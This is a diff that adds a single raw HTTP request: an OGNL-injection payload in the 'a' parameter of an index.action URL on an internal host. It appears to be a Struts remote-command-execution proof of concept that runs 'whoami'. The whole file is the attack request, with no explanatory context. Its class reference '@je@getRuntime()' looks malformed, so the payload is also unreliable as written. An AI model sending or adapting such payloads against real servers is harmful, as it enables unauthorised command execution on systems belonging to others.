@@ -1,0 +1,8 @@
+POST /xx/index.action?a=%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40je%40getRuntime%28%29.exec%28%27whoami%27%29%7D HTTP/1.1
+Host: 10.20.136.13
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Connection: close
+Content-Length: 0
